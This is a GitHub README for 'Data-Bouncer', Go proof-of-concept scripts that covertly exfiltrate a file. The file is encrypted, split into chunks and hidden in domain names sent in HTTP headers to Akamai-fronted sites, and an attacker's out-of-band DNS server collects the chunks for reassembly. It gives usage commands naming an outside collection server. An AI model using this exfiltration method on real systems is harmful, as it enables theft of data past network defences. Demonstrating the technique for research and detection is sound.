# Data-Bouncer

I came across this Proof of Concept outlined here in https://thecontractor.io/data-bouncing.
I took their ideas and wrote two Go scripts that can be used for demonstration purposes.

One that encrypts and bounces the data you want to exfiltrate and the other that reassembles and decrypts it.

You will need an OOB dns server under you're control for this to work and collect the data. Here I'm using https://github.com/projectdiscovery/interactsh

From my testing this should work on any url that touches Akamai.

### Bounce.go
This script reads your chosen domain names from domains.txt, first encrypts your chosen file using a password you provided, encodes the file into Base32 and finally splits it into 63 byte chunks and sends them as part of a domain name in an HTTP header.

Example:
```
go run bounce.go -f <filename.txt> -p <password> -u <UUID> -e <interact server url> -v
```

### Regenerate.go
This script reads the JSON output from your interactsh server, processes and reassembles the chunks and does the reverse by decoding, decrypting, and finally outputting the file.

Example:
```
go run regenerate.go -i <exported.json> -o <outputfile.txt> -p <password> -u <UUID> -v
```

### Images
Example of forward traffic from a FortiGate 

![FortiGate1](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/e4f26c0b-53ec-45db-a438-6fc340b87d1d)


Example of bouncing a file

![bounce](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/3ddfe42e-97f5-4693-b44b-8ecc544a8f0c)


Example of regenerating a file

![regen](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/6a2ac6d1-7d40-455b-b1ae-a83143078076)

Example from interactsh web client

![interactsh](https://github.com/BKlaasWerkman/Data-Bouncer/assets/105836264/8c8f3ac9-ccf8-44be-9417-36bff4bea1c4)

